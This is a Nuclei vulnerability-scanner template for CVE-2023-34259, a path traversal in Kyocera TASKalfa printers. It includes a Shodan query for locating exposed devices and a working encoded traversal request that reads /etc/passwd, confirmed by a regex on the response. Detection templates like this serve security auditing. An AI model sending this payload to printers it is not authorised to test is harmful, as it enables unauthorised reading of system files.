id: CVE-2023-34259

info:
  name: Kyocera TASKalfa printer - Path Traversal
  author: gy741
  severity: high
  description: |
    CCRX has a Path Traversal vulnerability. Path Traversal is an attack on web applications. By manipulating the value of the file path, an attacker can gain access to the file system, including source code and critical system settings.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://sec-consult.com/vulnerability-lab/advisory/path-traversal-bypass-denial-of-service-in-kyocera-printer/
    - https://www.kyoceradocumentsolutions.com/en/our-business/security/information/2023-07-14.html
    - https://packetstormsecurity.com/files/173397/Kyocera-TASKalfa-4053ci-2VG_S000.002.561-Path-Traversal-Denial-Of-Service.html
    - https://sec-consult.com/vulnerability-lab/
    - https://seclists.org/fulldisclosure/2023/Jul/15
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-34259
    cwe-id: CWE-22
    epss-score: 0.00049
    epss-percentile: 0.15798
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:-50306417
  tags: packetstorm,seclists,cve,cve2023,kyocera,lfi,printer

http:
  - method: GET
    path:
      - "{{BaseURL}}/wlmdeu%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00index.htm"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0"

      - type: word
        part: server
        words:
          - "KM-MFP"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100acf58a1c6fb7d086a1580c89aef72c54e8e77175369826d627cdd7b0a91fa2b7022076598b655832c141719e0b8ac18edd0689a2de4f971d87a50e113148322d8061:922c64590222798bb761d5b6d8e72950